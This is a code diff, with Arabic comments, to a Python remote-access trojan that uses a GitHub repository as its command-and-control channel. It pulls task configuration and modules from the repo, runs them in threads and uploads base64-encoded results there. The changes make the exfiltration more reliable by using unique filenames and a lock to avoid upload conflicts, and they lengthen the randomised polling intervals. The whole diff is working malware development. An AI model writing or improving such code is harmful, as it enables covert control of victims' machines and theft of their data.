@@ -6,8 +6,10 @@ import random
 import sys
 import threading
 import time
+import uuid  # مكتبة لإنشاء أسماء فريدة
 from datetime import datetime
 
+# إعداد الاتصال
 def github_connect():
     with open('mytoken.txt') as f:
         token = f.read().strip()
@@ -24,6 +26,8 @@ class Trojan:
         self.config_file = f'{id}.json'
         self.data_path = f'data/{id}/'
         self.repo = github_connect()
+        # إنشاء قفل لمنع التضارب عند الرفع
+        self.lock = threading.Lock()
 
     def get_config(self):
         config_json = get_file_contents('config', self.config_file, self.repo)
@@ -41,21 +45,35 @@ class Trojan:
             print(f"[-] Error running module {module}: {e}")
 
     def store_module_result(self, data):
-        message = datetime.now().isoformat()
-        remote_path = f'data/{self.id}/{message}.data'
+        # استخدام UUID لضمان عدم تكرار اسم الملف أبداً
+        message = datetime.now().isoformat().replace(":", "-")
+        unique_name = f'{message}_{uuid.uuid4()}.data'
+        remote_path = f'data/{self.id}/{unique_name}'
+        
         if isinstance(data, bytes):
             bindata = data
         else:
             bindata = bytes('%r' % data, 'utf-8')
-        self.repo.create_file(remote_path, message, base64.b64encode(bindata))
+            
+        # استخدام القفل لإجبار العمليات على الانتظار (يحل مشكلة 409 Conflict)
+        with self.lock:
+            try:
+                self.repo.create_file(remote_path, message, base64.b64encode(bindata))
+                print(f"[+] Data saved: {unique_name}")
+            except Exception as e:
+                print(f"[-] Failed to save data: {e}")
 
     def run(self):
         while True:
             config = self.get_config()
             for task in config:
-                thread = threading.Thread(target=self.module_runner, args=(task['module'],))
+                thread = threading.Thread(
+                    target=self.module_runner,
+                    args=(task['module'],)
+                )
                 thread.start()
-            time.sleep(random.randint(1, 10))
+            # زيادة وقت الانتظار قليلاً لتخفيف الضغط على الشبكة
+            time.sleep(random.randint(5, 20))
 
 class GitImporter:
     def __init__(self):
